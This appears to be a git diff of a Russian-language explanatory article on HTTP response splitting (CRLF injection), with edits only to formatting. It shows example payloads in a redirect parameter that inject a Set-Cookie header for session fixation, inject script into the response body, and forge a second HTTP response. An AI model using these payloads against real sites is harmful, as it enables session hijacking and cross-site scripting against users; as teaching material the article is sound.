@@ -1,5 +1,6 @@
 
 
+
 # уязвимость/атака
 
 ## Описание
@@ -19,13 +20,13 @@
 - При обнаружении информации, похожей на пользовательский ввод в него подставляются символы переноса строки (`%0D%0A` в URL-кодировке) и отслеживаются изменения заголовков.
 
 ## Эксплуатация
-Пример уязвимого эндпоинта: При переходе на `http://vulnerable?redirect=location`ответ выглядит следующим образом:
+Пример уязвимого эндпоинта: при переходе на `http://vulnerable?redirect=location`ответ выглядит следующим образом:
 ```http
 ...
 Location: location
 ...
 ```
-1) При передачи параметра `location=example.com%0d%0aSet-Cookie: Session_id=some_value` будет возвращено:
+- При передачи параметра `location=example.com%0d%0aSet-Cookie: Session_id=some_value` будет возвращено:
 ```http
 ...
 Location: example.com
@@ -33,7 +34,7 @@ Set-Cookie: Session_id=some_value
 ...
 ```
 В результате этого произойдет установка известной сессии.
-2) При передачи параметра `location=example.com%0d%0aX-XSS-Protection:0%%0d%0a%0d%0a<script>some_code</script>` будет возвращено:
+- При передачи параметра `location=example.com%0d%0aX-XSS-Protection:0%%0d%0a%0d%0a<script>some_code</script>` будет возвращено:
 ```http
 ...
 Location: example.com
@@ -43,7 +44,7 @@ X-XSS-Protection:0
 ...
 ```
 В этом случае переданный JavaScript код попадет в тело ответа и будет выполнен
-3) Есть возможность добавить добавить еще один ответ от сервера (при условии возможности инициировать несколько запросов пользователя). Например передав `location=example.com%0D%0A%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0A%0D%0A%3Chtml_code%3E` будет возвращено:
+- Есть возможность добавить добавить еще один ответ от сервера (при условии возможности инициировать несколько запросов пользователя). Например передав `location=example.com%0D%0A%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0A%0D%0A%3Chtml_code%3E` будет возвращено:
 ```http
 ...
 Location: example.com
